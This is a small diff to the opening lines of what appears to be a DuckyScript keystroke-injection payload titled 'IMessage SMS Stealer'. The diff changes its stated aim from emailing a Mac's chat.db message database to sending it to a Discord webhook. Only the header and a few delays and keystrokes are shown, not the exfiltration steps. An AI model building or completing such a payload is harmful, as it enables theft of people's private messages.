@@ -1,6 +1,5 @@
 REM Title: IMessage SMS Stealer
-REM Description: Steal the chat.db from a Mac and send it via email
-REM Notes: Experimental
+REM Description: Steal the chat.db from a Mac and send it through your discord webhook
 DELAY 1000
 GUI SPACE
 DELAY 1500
